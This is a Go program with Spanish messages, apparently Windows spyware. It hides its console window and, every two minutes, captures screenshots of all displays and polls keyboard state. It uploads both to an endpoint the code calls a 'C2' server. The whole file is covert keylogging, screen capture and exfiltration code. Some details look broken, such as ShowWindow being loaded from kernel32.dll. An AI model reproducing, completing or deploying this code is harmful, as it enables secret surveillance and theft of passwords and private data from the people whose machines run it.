package main

import (
	"bytes"
	"fmt"
	"image/png"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"path/filepath"
	"runtime"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)

func captureScreenshotAndSend() {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Println("Error capturando la pantalla:", err)
			continue
		}

		var imgBuffer bytes.Buffer
		png.Encode(&imgBuffer, img)

		err = sendToC2("screenshot.png", imgBuffer.Bytes())
		if err != nil {
			fmt.Println("Error enviando captura al C2:", err)
		} else {
			fmt.Println("Captura enviada al C2.")
		}
	}
}

func captureKeystrokes() string {
	var result string
	for key := 0; key <= 256; key++ {
		state, _, _ := procGetAsyncKeyState.Call(uintptr(key))
		if state&0x8000 != 0 {
			result += fmt.Sprintf("%d ", key)
		}
	}
	return result
}

func sendToC2(filename string, data []byte) error {
	url := "http://localhost:9090/upload"
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(filename))
	if err != nil {
		return err
	}
	_, err = part.Write(data)
	if err != nil {
		return err
	}
	err = writer.Close()
	if err != nil {
		return err
	}
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	fmt.Println("Respuesta del C2:", string(respBody))
	return nil
}

func hideWindow() {
	if runtime.GOOS == "windows" {
		var modkernel32 = syscall.NewLazyDLL("kernel32.dll")
		var procGetConsoleWindow = modkernel32.NewProc("GetConsoleWindow")
		var procShowWindow = modkernel32.NewProc("ShowWindow")
		hwnd, _, _ := procGetConsoleWindow.Call()
		procShowWindow.Call(hwnd, uintptr(0))
	}
}

func main() {
	hideWindow()
	for {
		go captureScreenshotAndSend()
		keystrokes := captureKeystrokes()
		if keystrokes != "" {
			go sendToC2("keystrokes.txt", []byte(keystrokes))
		}
		time.Sleep(2 * time.Minute)
	}
}
